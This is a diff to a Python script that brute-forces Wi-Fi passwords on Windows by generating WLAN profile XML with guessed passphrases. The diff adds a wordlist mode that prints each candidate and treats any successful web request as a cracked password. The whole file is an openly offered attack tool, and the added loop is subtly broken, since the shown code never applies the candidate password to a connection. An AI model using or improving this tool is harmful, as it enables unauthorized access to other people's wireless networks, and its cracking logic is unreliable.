@@ -1,5 +1,5 @@
 #update version changer:
-up = "2"
+up = "3"
 
 import random
 import time
@@ -8,6 +8,7 @@ import os
 import pyfiglet
 import random
 import string
+import sys
 os.system('clear')
 def get_random_string(length):
     # With combination of lower and upper case
@@ -26,7 +27,7 @@ print(ascii_banner)
 print("\033[1;33;40m \n")
 print('                                   by: BatyoAron')
 print('                                   update version:' + up)
-if up =="2":print('')
+if up =="3":print('')
 else:
     print('new version is available')
 print("\033[1;32;40m \n")
@@ -58,49 +59,27 @@ def createNewConnection(name, SSID, password):
 
     config = """<?xml version=\"1.0\"?>
 <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
-
     <name>"""+name+"""</name>
-
     <SSIDConfig>
-
         <SSID>
-
             <name>"""+SSID+"""</name>
-
         </SSID>
-
     </SSIDConfig>
-
     <connectionType>ESS</connectionType>
-
     <connectionMode>auto</connectionMode>
-
     <MSM>
-
         <security>
-
             <authEncryption>
-
                 <authentication>WPA2PSK</authentication>
-
                 <encryption>AES</encryption>
-
                 <useOneX>false</useOneX>
-
             </authEncryption>
-
             <sharedKey>
-
                 <keyType>passPhrase</keyType>
-
                 <protected>false</protected>
-
                 <keyMaterial>"""+password+"""</keyMaterial>
-
             </sharedKey>
-
         </security>
-
     </MSM>
 </WLANProfile>"""
 
@@ -134,7 +113,24 @@ displayAvailableNetworks()
  
 # input wifi name and password
 
-name = input("Name of Wi-Fi: ")
+name = input(" [ one by one ] Name of Wi-Fi: ")
+
+print('')
+wordlist = input('type wordlist name with .txt [ type x if you didnt have wordlist ]: ')
+
+if os.path.isfile(wordlist):
+    print('')
+else:
+    if wordlist == "x":
+        print('')
+    else:
+        print("\033[1;31;40m \n")
+        print('wordlist not found')
+        time.sleep(1)
+        os.execl(sys.executable, sys.executable, *sys.argv)
+
+        
+
 time.sleep(3)
 count = 0
 while (count < 100):
@@ -149,6 +145,28 @@ time.sleep(3)
 
  
 # establish new connection
+
+
+if os.path.isfile(wordlist):
+    
+    count = 0
+    while (count < 5000000):
+        count = count +1
+        
+        f = open(wordlist)
+        for abc in f:
+            print("\033[1;31;40m \n")
+            print('trying: ' + abc)
+            time.sleep(1)
+            
+            print('')
+            url = "http://www.kite.com"
+            try:
+                request = requests.get(url, timeout=timeout)
+                print('password cracked with the last password you see/or connected to the wifi')
+                exit()
+            except (requests.ConnectionError, requests.Timeout) as exception:
+               print("wrong password")
 
 
 
@@ -238,4 +256,3 @@ while (count < 100000):
     
 print("\033[1;31;40m \n")
 print("password is too powerful to crack / the internet is not turned on ):")
-
